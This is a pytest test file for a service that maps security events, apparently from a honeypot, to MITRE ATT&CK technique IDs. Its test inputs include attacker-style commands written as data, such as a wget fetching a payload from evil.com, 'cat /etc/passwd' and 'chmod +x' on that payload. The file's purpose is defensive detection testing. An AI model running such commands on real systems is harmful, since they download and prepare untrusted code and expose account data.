from __future__ import annotations
import pytest
from app.services.mitre import map_event_to_techniques, TECHNIQUES


class TestMitreMapping:
    def test_login_failed_maps_to_t1110(self):
        techs = map_event_to_techniques("login_failed", None, "external", None)
        assert "T1110" in techs

    def test_brute_force_classification_maps_to_t1110(self):
        techs = map_event_to_techniques("connect", None, "external", "brute_force")
        assert "T1110" in techs

    def test_login_success_maps_to_t1078(self):
        techs = map_event_to_techniques("login_success", None, "external", None)
        assert "T1078" in techs

    def test_whoami_maps_to_t1082(self):
        techs = map_event_to_techniques("command", "whoami", "external", None)
        assert "T1082" in techs

    def test_cat_passwd_maps_to_t1087(self):
        techs = map_event_to_techniques("command", "cat /etc/passwd", "external", None)
        assert "T1087" in techs

    def test_ls_maps_to_t1083(self):
        techs = map_event_to_techniques("command", "ls /tmp", "external", None)
        assert "T1083" in techs

    def test_wget_maps_to_t1105(self):
        techs = map_event_to_techniques("command", "wget http://evil.com/payload.sh", "external", None)
        assert "T1105" in techs

    def test_chmod_maps_to_t1222(self):
        techs = map_event_to_techniques("command", "chmod +x /tmp/payload.sh", "external", None)
        assert "T1222" in techs

    def test_crontab_maps_to_t1053(self):
        techs = map_event_to_techniques("command", "crontab -e", "external", None)
        assert "T1053" in techs

    def test_scan_maps_to_t1046(self):
        techs = map_event_to_techniques("scan", None, "external", None)
        assert "T1046" in techs

    def test_internal_decoy_maps_to_t1021(self):
        techs = map_event_to_techniques("connect", None, "internal", None)
        assert "T1021" in techs

    def test_techniques_dict_complete(self):
        required = ["T1110", "T1078", "T1082", "T1087", "T1083", "T1105", "T1222", "T1053", "T1046", "T1021"]
        for tech_id in required:
            assert tech_id in TECHNIQUES
            assert "name" in TECHNIQUES[tech_id]
            assert "tactic" in TECHNIQUES[tech_id]

